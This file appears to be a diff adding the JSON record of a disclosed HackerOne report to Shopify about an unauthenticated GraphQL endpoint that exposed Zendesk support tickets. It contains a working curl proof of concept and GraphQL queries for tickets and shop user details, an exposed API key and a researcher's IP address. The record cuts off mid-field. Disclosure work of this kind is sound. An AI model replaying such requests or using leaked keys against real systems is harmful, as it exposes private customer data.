@@ -1,0 +1,561 @@
+{
+    "abilities": {
+        "can_manage_common_responses?": false, 
+        "can_manage_collaborators?": false, 
+        "can_reopen?": false, 
+        "can_ban_researcher?": false, 
+        "can_create_severity?": false, 
+        "can_assign_to_h1_triage?": false, 
+        "can_agree_on_going_public?": false, 
+        "assignable_team_member_groups": [], 
+        "can_view_credential_account_details?": false, 
+        "can_export?": false, 
+        "can_create_retest?": false, 
+        "can_assign_to_user?": false, 
+        "can_use_common_responses?": false, 
+        "can_hide_timeline?": false, 
+        "can_be_manually_disclosed?": false, 
+        "assignable_team_members": [], 
+        "can_clone?": false, 
+        "can_be_publicly_disclosed?": false, 
+        "can_close_comments?": false, 
+        "can_view_bounty_weights?": false, 
+        "can_suggest_bounty_amount?": false, 
+        "can_cancel_disclosure_request?": false, 
+        "can_redact?": false, 
+        "can_change_structured_scope?": false, 
+        "can_post_internal_comments?": false, 
+        "can_change_state?": false, 
+        "can_change_weakness?": false, 
+        "can_add_comment?": false, 
+        "can_reassign_to_team?": false, 
+        "can_change_title?": false, 
+        "can_award_bounty?": false, 
+        "can_award_swag?": false, 
+        "can_close?": false, 
+        "can_manage?": false
+    }, 
+    "comments_closed?": false, 
+    "substate": "resolved", 
+    "bug_reporter_agreed_on_going_public_at": "2018-09-19T16:15:48.930Z", 
+    "voters": [
+        "pajoda", 
+        "secator", 
+        "spam404", 
+        "teknogeek", 
+        "zombiehelp54", 
+        "bogdantcaciuc", 
+        "emitrani", 
+        "flashdisk", 
+        "asad0x01_", 
+        "ak1", 
+        "and 28 more..."
+    ], 
+    "facebook_team?": false, 
+    "has_bounty?": true, 
+    "bounty_amount": "5000.0", 
+    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
+    "original_report_id": null, 
+    "id": 397130, 
+    "can_view_team": true, 
+    "team_member_agreed_on_going_public_at": "2018-09-19T14:53:56.702Z", 
+    "vulnerability_information": "**Summary**\n\nathena-flex-production.shopifycloud.com seems to be an internal system that Shopify uses because it redirects user to Okta login. During this however, I noticed that it first returns 200 and then does a redirect meaning some part of the website loads before redirecting. With this, I was able to get the JS being used in the system. Through the JS file, I found a path that allows GraphQL queries thus resulting in a full dump of Zendesk ticket information. \n\n**Description**\n\nWhen you originally go to athena-flex-production.shopifycloud.com you will find that it will redirect to Okta. However if you do `view-source:athena-flex-production.shopifycloud.com` in Chrome, it will show that the website loads momentarily. In one of the script src, there is this link requested by the website: \n\nhttps://cdn.shopifycloud.com/athena-flex/assets/main-3fe2559f5e86bcc7d88fe611b71942faa73e787afbc2126a601662ab254a36fc.js\n\nWhen you beautify the JS file you will notice it has some query data that can be used at the /graphql endpoint. After I got this, I started to play around with the GraphQL schema and see what I could gain access to. \n\nFor my test I sent: \n\n```\n{\"query\": \"query getRecentTicketsQuery($domain: String) {\\n    shop(myshopifyDomain: $domain) {\\n      zendesk {\\n        tickets(last: 5) {\\n          edges {\\n            node {\\n              id\\n               requester {\\n                name\\n              }\\n              subject\\n              description\\n              }\\n          }\\n        }\\n      }\\n    }\\n  }\\n\",\"variables\":{\"domain\":\"ok.myshopify.com\"}}\n```\n\nWhat this query says is: Return last 5 tickets with description, reporter name and subject of the ticket that contain domain ok.myshopify.com. Once the query was done, it responded with 9,259 bytes of JSON response that contained extremely critical data. \n\nI don't want to paste the data here for obvious reason but I am attacking the file here so you can delete it by contact support@hackerone.com later if you wish to disclose the report. \n\n\n**Reproduction**\n1. Send the following curl request: \n\n```\ncurl -i -s -k  -X $'POST' \\\n    -H $'Host: athena-flex-production.shopifycloud.com' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Content-Type: application/json' -H $'Connection: close' -H $'Upgrade-Insecure-Requests: 1' -H $'Content-Length: 422' \\\n    --data-binary $'{\\\"query\\\": \\\"query getRecentTicketsQuery($domain: String) {\\\\n    shop(myshopifyDomain: $domain) {\\\\n      zendesk {\\\\n        tickets(last: 5) {\\\\n          edges {\\\\n            node {\\\\n              id\\\\n               requester {\\\\n                name\\\\n              }\\\\n              subject\\\\n              description\\\\n              }\\\\n          }\\\\n        }\\\\n      }\\\\n    }\\\\n  }\\\\n\\\",\\\"variables\\\":{\\\"domain\\\":\\\"ok.myshopify.com\\\"}}' \\\n    $'https://athena-flex-production.shopifycloud.com/graphql'\n```\n\n**More information**\n\nThere is also an API key that I found on the JS file. I think this might be the Zendesk api key but I am not yet sure: \n\n```\nR = n.n(O)()({\n apiKey: \"5c0246635b3c77189888c0b10d3427ac\",\n notifyReleaseStages: [\"production\"],\n releaseStage: \"production\" \n}),\n```\n\n## Impact\n\n1. Get ticket description means dumping any detail you want. \n2. Creating zendesk ticket in behalf of other agents. \n3. Changing state of other tickets. \n\n**I will post list of all functions that is possible in this graphql.**", 
+    "activity_page_count": 1, 
+    "severity": {
+        "metrics": {
+            "confidentiality": "high", 
+            "privileges_required": "none", 
+            "user_interaction": "none", 
+            "attack_vector": "network", 
+            "attack_complexity": "low", 
+            "scope": "unchanged", 
+            "integrity": "high", 
+            "availability": "none"
+        }, 
+        "rating": "critical", 
+        "score": 9.8, 
+        "author_type": "User"
+    }, 
+    "title": "Unauthenticated access to Zendesk tickets through athena-flex-production.shopifycloud.com Okta bypass", 
+    "is_member_of_team?": null, 
+    "vote_count": 38, 
+    "summaries": [
+        {
+            "category": "team", 
+            "can_view?": true, 
+            "can_edit?": false, 
+            "id": 10619, 
+            "content": "@rijalrojan discovered an application and endpoint under `athena-flex-production.shopifycloud.com `that exposed metadata and contents of our Zendesk tickets. Within a couple hours, we had put it behind an OAuth portal to mitigate the issue. After an internal investigation revealed no evidence of malicious access to the data, we rewarded him with the highest bounty available under our non-core authentication bypass category ($5,000). We did this despite the app being out of scope because of the severity of the information disclosure. As always, out-of-scope rewards are at our sole discretion.", 
+            "content_html": "<p><a href=\"/rijalrojan\">@rijalrojan</a> discovered an application and endpoint under <code>athena-flex-production.shopifycloud.com</code>that exposed metadata and contents of our Zendesk tickets. Within a couple hours, we had put it behind an OAuth portal to mitigate the issue. After an internal investigation revealed no evidence of malicious access to the data, we rewarded him with the highest bounty available under our non-core authentication bypass category ($5,000). We did this despite the app being out of scope because of the severity of the information disclosure. As always, out-of-scope rewards are at our sole discretion.</p>\n"
+        }, 
+        {
+            "category": "researcher", 
+            "can_create?": false, 
+            "can_view?": true
+        }
+    ], 
+    "structured_scope": {
+        "asset_identifier": "partners.shopify.com", 
+        "max_severity": "critical", 
+        "databaseId": 422, 
+        "asset_type": "URL"
+    }, 
+    "allow_singular_disclosure_at": null, 
+    "state": "Closed", 
+    "cve_ids": [], 
+    "activity_page_number": 1, 
+    "readable_substate": "Resolved", 
+    "public": true, 
+    "formatted_bounty": "$5,000", 
+    "singular_disclosure_disabled": true, 
+    "activities": [
+        {
+            "automated_response": false, 
+            "created_at": "2018-08-20T00:18:32.863Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-08-20T00:23:52.647Z", 
+            "actor": {
+                "username": "rijalrojan", 
+                "url": "/rijalrojan", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/098/168/db57eed0c691b216e026c000b0a5b5ea019fcb13_medium.jpg?1532049493"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "shopify", 
+            "message": "Easy hot patch for it is to move this completely behind Okta and not load any content on the site before authentication. Additionally, put GraphQL behind auth (require auth token at the least)", 
+            "markdown_message": "<p>Easy hot patch for it is to move this completely behind Okta and not load any content on the site before authentication. Additionally, put GraphQL behind auth (require auth token at the least)</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 3218141, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-08-20T00:40:48.263Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-08-20T00:47:16.667Z", 
+            "actor": {
+                "username": "rijalrojan", 
+                "url": "/rijalrojan", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/098/168/db57eed0c691b216e026c000b0a5b5ea019fcb13_medium.jpg?1532049493"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "shopify", 
+            "message": "There is also another domain vulnerable to this same exact thing: athena-flex.shopifycloud.com. \n\nAlso for Incident response if needed, here is my IP: 76.169.119.108. This is what I used to access the app and use the graphql endpoint.", 
+            "markdown_message": "<p>There is also another domain vulnerable to this same exact thing: athena-flex.shopifycloud.com. </p>\n\n<p>Also for Incident response if needed, here is my IP: 76.169.119.108. This is what I used to access the app and use the graphql endpoint.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 3218153, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-08-20T01:02:41.576Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-08-20T01:10:06.683Z", 
+            "actor": {
+                "username": "rijalrojan", 
+                "url": "/rijalrojan", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/098/168/db57eed0c691b216e026c000b0a5b5ea019fcb13_medium.jpg?1532049493"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "shopify", 
+            "message": "I think this can be more than zendesk because just noticed there is another GraphQL query that probably leads to shop info disclosure. **I cannot investigate it anymore because the site is down**: \n\n```\n\"\\n  query getShopInfo($domain: String) {\\n    shop(myshopifyDomain: $domain) {\\n      shopInfo {\\n        errors {\\n          code\\n          message\\n        }\\n        id\\n        domain\\n        myshopifyDomain\\n        currency\\n        countryName\\n        createdAt\\n        planDisplayName\\n        planName\\n        planPeriod\\n        timezone\\n        users {\\n          id\\n          firstName\\n          lastName\\n          email\\n          userType\\n          permissions\\n        }\\n      }\\n      reportify(since: 12) {\\n        gmv\\n      }\\n      askPrompts {\\n        edges {\\n          node {\\n            name\\n            url\\n            zendeskTag\\n            openOpportunity\\n            eligible\\n          }\\n        }\\n      }\\n    }\\n  }\\n\n```\n\nI am assuming this can result in more disclosure such as email, name and other information about the user. ", 
+            "markdown_message": "<p>I think this can be more than zendesk because just noticed there is another GraphQL query that probably leads to shop info disclosure. <strong>I cannot investigate it anymore because the site is down</strong>: </p>\n<pre class=\"highlight plaintext\"><code>&quot;\\n  query getShopInfo($domain: String) {\\n    shop(myshopifyDomain: $domain) {\\n      shopInfo {\\n        errors {\\n          code\\n          message\\n        }\\n        id\\n        domain\\n        myshopifyDomain\\n        currency\\n        countryName\\n        createdAt\\n        planDisplayName\\n        planName\\n        planPeriod\\n        timezone\\n        users {\\n          id\\n          firstName\\n          lastName\\n          email\\n          userType\\n          permissions\\n        }\\n      }\\n      reportify(since: 12) {\\n        gmv\\n      }\\n      askPrompts {\\n        edges {\\n          node {\\n            name\\n            url\\n            zendeskTag\\n            openOpportunity\\n            eligible\\n          }\\n        }\\n      }\\n    }\\n  }\\n\n</code></pre>\n<p>I am assuming this can result in more disclosure such as email, name and other information about the user. </p>\n", 
+            "type": "Activities::Comment", 
+            "id": 3218164, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-08-20T01:42:15.668Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-08-20T01:42:15.668Z", 
+            "actor": {
+                "username": "thisisfine_coffee", 
+                "url": "/thisisfine_coffee", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/166/251/d0c5a6f356d02791eccf2f8be5bc816e6f1d1b09_medium.jpg?1495574991"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "shopify", 
+            "message": "Hi @rijalrojan,\n\nThank you for your report. We were able to reproduce the issue and our engineering team is working on a fix.", 
+            "markdown_message": "<p>Hi <a href=\"/rijalrojan\">@rijalrojan</a>,</p>\n\n<p>Thank you for your report. We were able to reproduce the issue and our engineering team is working on a fix.</p>\n", 
+            "type": "Activities::BugTriaged", 
+            "id": 3218210, 
+            "genius_execution_id": null
+        }, 
+        {
+            "bounty_currency": "usd", 
+            "automated_response": false, 
+            "created_at": "2018-08-20T14:04:03.851Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-08-20T14:04:03.851Z", 
+            "actor": {
+                "url": "/shopify", 
+                "profile": {
+                    "name": "Shopify"
+                }, 
+                "ibb": false, 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/001/382/30421c25f4a7b03ec3250e36efb64f7291402806_medium.jpg?1532728703"
+                }
+            }, 
+            "team_handle": "shopify", 
+            "bonus_amount": "0.0", 
+            "bounty_amount": "500.0", 
+            "collaborator": {
+                "username": "rijalrojan", 
+                "url": "/rijalrojan"
+            }, 
+            "message": "Thank you for the report! We're awarding an initial 500$ after triage and we will determine the final amount once the issue is marked as resolved.", 
+            "markdown_message": "<p>Thank you for the report! We&#39;re awarding an initial 500$ after triage and we will determine the final amount once the issue is marked as resolved.</p>\n", 
+            "type": "Activities::BountyAwarded", 
+            "id": 3220962, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-08-20T16:38:58.784Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-08-20T16:38:58.784Z", 
+            "actor": {
+                "username": "rijalrojan", 
+                "url": "/rijalrojan", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/098/168/db57eed0c691b216e026c000b0a5b5ea019fcb13_medium.jpg?1532049493"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "shopify", 
+            "message": "Thanks! Please let me know if I can be of any help :) \nCheers!\n@rijalrojan ", 
+            "markdown_message": "<p>Thanks! Please let me know if I can be of any help :) <br>\nCheers!<br>\n<a href=\"/rijalrojan\">@rijalrojan</a> </p>\n", 
+            "type": "Activities::Comment", 
+            "id": 3221489, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-08-20T20:36:55.403Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-08-20T20:36:55.403Z", 
+            "actor": {
+                "username": "rijalrojan", 
+                "url": "/rijalrojan", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/098/168/db57eed0c691b216e026c000b0a5b5ea019fcb13_medium.jpg?1532049493"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "shopify", 
+            "message": "This now redirects to OAuth2 login endpoint so the fix so far looks pretty solid. \nCheers!\n@rijalrojan ", 
+            "markdown_message": "<p>This now redirects to OAuth2 login endpoint so the fix so far looks pretty solid. <br>\nCheers!<br>\n<a href=\"/rijalrojan\">@rijalrojan</a> </p>\n", 
+            "type": "Activities::Comment", 
+            "id": 3222493, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-08-23T15:30:26.605Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-08-23T15:30:26.605Z", 
+            "actor": {
+                "username": "rijalrojan", 
+                "url": "/rijalrojan", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/098/168/db57eed0c691b216e026c000b0a5b5ea019fcb13_medium.jpg?1532049493"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "shopify", 
+            "message": "I am extremely happy with the fixes being applied. I do daily monitoring of shopifycloud.com subdomains and it seems like a lot of them are moving to either Oauth2 or to GSuite (which also migrated to Okta). Thank you so much for working to fix the bug throughout the subdomains and not just fixing them one by one as the reports came! \n\nCheers!\n@rijalrojan ", 
+            "markdown_message": "<p>I am extremely happy with the fixes being applied. I do daily monitoring of shopifycloud.com subdomains and it seems like a lot of them are moving to either Oauth2 or to GSuite (which also migrated to Okta). Thank you so much for working to fix the bug throughout the subdomains and not just fixing them one by one as the reports came! </p>\n\n<p>Cheers!<br>\n<a href=\"/rijalrojan\">@rijalrojan</a> </p>\n", 
+            "type": "Activities::Comment", 
+            "id": 3236207, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-09-06T21:24:00.602Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-09-06T21:24:00.602Z", 
+            "actor": {
+                "username": "rijalrojan", 
+                "url": "/rijalrojan", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/098/168/db57eed0c691b216e026c000b0a5b5ea019fcb13_medium.jpg?1532049493"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "shopify", 
+            "message": "Hi, \nNot to rush things but do you guys have an estimate of when this report can be closed?\nThanks!\n@rijalrojan ", 
+            "markdown_message": "<p>Hi, <br>\nNot to rush things but do you guys have an estimate of when this report can be closed?<br>\nThanks!<br>\n<a href=\"/rijalrojan\">@rijalrojan</a> </p>\n", 
+            "type": "Activities::Comment", 
+            "id": 3303322, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "reporter": {
+                "username": "rijalrojan", 
+                "url": "/rijalrojan"
+            }, 
+            "created_at": "2018-09-19T13:54:54.231Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-09-19T13:54:54.231Z", 
+            "actor": {
+                "username": "jack_mccracken", 
+                "url": "/jack_mccracken", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/164/342/d84663e45cc32643d2cf593fcc17d1b5db05255e_medium.jpeg?1495044147"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "shopify", 
+            "message": "Hey @rijalrojan,\n\nWe're good to close this off as resolved now. As you noticed we mitigated this a couple hours after the report but wanted to make sure we did all our due diligence on the Shopify side of things.\n\nOur bounty decision should come through in the next week or so.", 
+            "markdown_message": "<p>Hey <a href=\"/rijalrojan\">@rijalrojan</a>,</p>\n\n<p>We&#39;re good to close this off as resolved now. As you noticed we mitigated this a couple hours after the report but wanted to make sure we did all our due diligence on the Shopify side of things.</p>\n\n<p>Our bounty decision should come through in the next week or so.</p>\n", 
+            "type": "Activities::BugResolved", 
+            "id": 3358457, 
+            "genius_execution_id": null
+        }, 
+        {
+            "bounty_currency": "usd", 
+            "automated_response": false, 
+            "created_at": "2018-09-19T14:53:40.026Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-09-19T14:53:40.026Z", 
+            "actor": {
+                "url": "/shopify", 
+                "profile": {
+                    "name": "Shopify"
+                }, 
+                "ibb": false, 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/001/382/30421c25f4a7b03ec3250e36efb64f7291402806_medium.jpg?1532728703"
+                }
+            }, 
+            "team_handle": "shopify", 
+            "bonus_amount": "0.0", 
+            "bounty_amount": "4500.0", 
+            "collaborator": {
+                "username": "rijalrojan", 
+                "url": "/rijalrojan"
+            }, 
+            "message": "We're awarding an additional amount for a total of 5000$ which the top of our bounty range for authentication bypass in this application. Thanks again for the report, looking forward to the next one!", 
+            "markdown_message": "<p>We&#39;re awarding an additional amount for a total of 5000$ which the top of our bounty range for authentication bypass in this application. Thanks again for the report, looking forward to the next one!</p>\n", 
+            "type": "Activities::BountyAwarded", 
+            "id": 3358759, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-09-19T14:53:57.250Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-09-19T14:53:57.250Z", 
+            "actor": {
+                "username": "francoischagnon", 
+                "url": "/francoischagnon", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/019/168/3b5130025fbf90eaeb1c9234baa340dfead68f44_medium.jpg?1429126005"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "shopify", 
+            "first_to_agree": true, 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::AgreedOnGoingPublic", 
+            "id": 3358762, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-09-19T15:59:15.209Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-09-19T15:59:15.209Z", 
+            "actor": {
+                "username": "rijalrojan", 
+                "url": "/rijalrojan", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/098/168/db57eed0c691b216e026c000b0a5b5ea019fcb13_medium.jpg?1532049493"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "shopify", 
+            "message": "@francoischagnon before we go public with this report, can we remove the data.json file because it contains some support ticket infos? \nThanks!\n@rijalrojan ", 
+            "markdown_message": "<p><a href=\"/francoischagnon\">@francoischagnon</a> before we go public with this report, can we remove the data.json file because it contains some support ticket infos? <br>\nThanks!<br>\n<a href=\"/rijalrojan\">@rijalrojan</a> </p>\n", 
+            "type": "Activities::Comment", 
+            "id": 3359015, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-09-19T16:00:31.292Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-09-19T16:00:31.292Z", 
+            "actor": {
+                "username": "jack_mccracken", 
+                "url": "/jack_mccracken", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/164/342/d84663e45cc32643d2cf593fcc17d1b5db05255e_medium.jpeg?1495044147"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "shopify", 
+            "message": "Hey @rijalrojan,\n\nWe have an email out to HackerOne asking for this data to be removed. Hopefully it'll be responded to soon and we can get this report disclosed :)", 
+            "markdown_message": "<p>Hey <a href=\"/rijalrojan\">@rijalrojan</a>,</p>\n\n<p>We have an email out to HackerOne asking for this data to be removed. Hopefully it&#39;ll be responded to soon and we can get this report disclosed :)</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 3359022, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-09-19T16:10:17.693Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-09-19T16:10:17.693Z", 
+            "actor": {
+                "username": "rijalrojan", 
+                "url": "/rijalrojan", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/098/168/db57eed0c691b216e026c000b0a5b5ea019fcb13_medium.jpg?1532049493"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "shopify", 
+            "message": "Also @jack_mccracken for the summary: I think it should be `all zendesk tickets` not `recent zendesk tickets`. For my PoC I did top 5 recent but there were multiple queries that could be done which would in the end dump every zendesk tickets in shopify.zendesk.com. ", 
+            "markdown_message": "<p>Also <a href=\"/jack_mccracken\">@jack_mccracken</a> for the summary: I think it should be <code>all zendesk tickets</code> not <code>recent zendesk tickets</code>. For my PoC I did top 5 recent but there were multiple queries that could be done which would in the end dump every zendesk tickets in shopify.zendesk.com. </p>\n", 
+            "type": "Activities::Comment", 
+            "id": 3359041, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-09-19T16:15:49.008Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-09-19T16:15:49.008Z", 
+            "actor": {
+                "username": "rijalrojan", 
+                "url": "/rijalrojan", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/098/168/db57eed0c691b216e026c000b0a5b5ea019fcb13_medium.jpg?1532049493"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "shopify", 
+            "message": "The file is removed. We are good to go public. ", 
+            "markdown_message": "<p>The file is removed. We are good to go public. </p>\n", 
+            "type": "Activities::AgreedOnGoingPublic", 
+            "id": 3359058, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-09-19T16:15:49.233Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-09-19T16:15:49.233Z", 
+            "actor": {
+                "username": "rijalrojan", 
+                "url": "/rijalrojan", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/098/168/db57eed0c691b216e026c000b0a5b5ea019fcb13_medium.jpg?1532049493"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "shopify", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::ReportBecamePublic", 
+            "id": 3359059, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-09-19T16:34:06.293Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-09-19T16:34:06.293Z", 
+            "actor": {
+                "username": "jack_mccracken", 
+                "url": "/jack_mccracken", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/164/342/d84663e45cc32643d2cf593fcc17d1b5db05255e_medium.jpeg?1495044147"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "shopify", 
+            "message": "Updated the summary to be more accurate", 
+            "markdown_message": "<p>Updated the summary to be more accurate</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 3359117, 
+            "genius_execution_id": null
+        }
+    ], 
+    "in_validation?": false, 
+    "is_participant": false, 
+    "reporter": {
+        "username": "rijalrojan", 
+        "hacker_mediation": false, 
+        "hackerone_triager": false, 
+        "disabled": false, 
+        "url": "/rijalrojan", 
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/000/098/168/42330eda3a4c90f45cae28f9a24ecb85b845f902_small.jpg?1532049493"
+        }, 
+        "is_me?": false
+    }, 
+    "weakness": {
+        "id": 27, 
+        "name": "Improper Authentication - Generic"
+    }, 
+    "is_external_bug": false, 
+    "visibility": "full", 
+    "disclosed_at": "2018-09-19T16:15:49.202Z", 
+    "stage": 4, 
+    "url": "https://hackerone.com/reports/397130", 
+    "created_at": "2018-08-20T00:14:05.542Z", 
+    "original_report_url": null, 
+    "vulnerability_information_html": "<p><strong>Summary</strong></p>\n\n<p>athena-flex-production.shopifycloud.com seems to be an internal system that Shopify uses because it redirects user to Okta login. During this however, I noticed that it first returns 200 and then does a redirect meaning some part of the website loads before redirecting. With this, I was able to get the JS being used in the system. Through the JS file, I found a path that allows GraphQL queries thus resulting in a full dump of Zendesk ticket information. </p>\n\n<p><strong>Description</strong></p>\n\n<p>When you originally go to athena-flex-production.shopifycloud.com you will find that it will redirect to Okta. However if you do <code>view-source:athena-flex-production.shopifycloud.com</code> in Chrome, it will show that the website loads momentarily. In one of the script src, there is this link requested by the website: </p>\n\n<p><a title=\"https://cdn.shopifycloud.com/athena-flex/assets/main-3fe2559f5e86bcc7d88fe611b71942faa73e787afbc2126a601662ab254a36fc.js\" href=\"/redirect?signature=bec564224a6164ee0c2ef7acdf9fd06e9a024c8d&amp;url=https%3A%2F%2Fcdn.shopifycloud.com%2Fathena-flex%2Fassets%2Fmain-3fe2559f5e86bcc7d88fe611b71942faa73e787afbc2126a601662ab254a36fc.js\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://cdn.shopifycloud.com/athena-flex/assets/main-3fe2559f5e86bcc7d88fe611b71942faa73e787afbc2126a601662ab254a36fc.js</span><i class=\"icon-external-link\"></i></a></p>\n\n<p>When you beautify the JS file you will notice it has some query data that can be used at the /graphql endpoint. After I got this, I started to play around with the GraphQL schema and see what I could gain access to. </p>\n\n<p>For my test I sent: </p>\n<pre class=\"highlight plaintext\"><code>{&quot;query&quot;: &quot;query getRecentTicketsQuery($domain: String) {\\n    shop(myshopifyDomain: $domain) {\\n      zendesk {\\n        tickets(last: 5) {\\n          edges {\\n            node {\\n              id\\n               requester {\\n                name\\n              }\\n              subject\\n              description\\n              }\\n          }\\n        }\\n      }\\n    }\\n  }\\n&quot;,&quot;variables&quot;:{&quot;domain&quot;:&quot;ok.myshopify.com&quot;}}\n</code></pre>\n<p>What this query says is: Return last 5 tickets with description, reporter name and subject of the ticket that contain domain ok.myshopify.com. Once the query was done, it responded with 9,259 bytes of JSON response that contained extremely critical data. </p>\n\n<p>I don&#39;t want to paste the data here for obvious reason but I am attacking the file here so you can delete it by contact <a title=\"support@hackerone.com\" href=\"mailto:support@hackerone.com\" rel=\"nofollow noopener noreferrer\">support@hackerone.com</a> later if you wish to disclose the report. </p>\n\n<p><strong>Reproduction</strong></p>\n\n<ol>\n<li>Send the following curl request: </li>\n</ol>\n<pre class=\"highlight plaintext\"><code>curl -i -s -k  -X $&#39;POST&#39; \\\n    -H $&#39;Host: athena-flex-production.shopifycloud.com&#39; -H $&#39;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0&#39; -H $&#39;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#39; -H $&#39;Accept-Language: en-US,en;q=0.5&#39; -H $&#39;Accept-Encoding: gzip, deflate&#39; -H $&#39;Content-Type: application/json&#39; -H $&#39;Connection: close&#39; -H $&#39;Upgrade-Insecure-Requests: 1&#39; -H $&#39;Content-Length: 422&#39; \\\n    --data-binary $&#39;{\\&quot;query\\&quot;: \\&quot;query getRecentTicketsQuery($domain: String) {\\\\n    shop(myshopifyDomain: $domain) {\\\\n      zendesk {\\\\n        tickets(last: 5) {\\\\n          edges {\\\\n            node {\\\\n              id\\\\n               requester {\\\\n                name\\\\n              }\\\\n              subject\\\\n              description\\\\n              }\\\\n          }\\\\n        }\\\\n      }\\\\n    }\\\\n  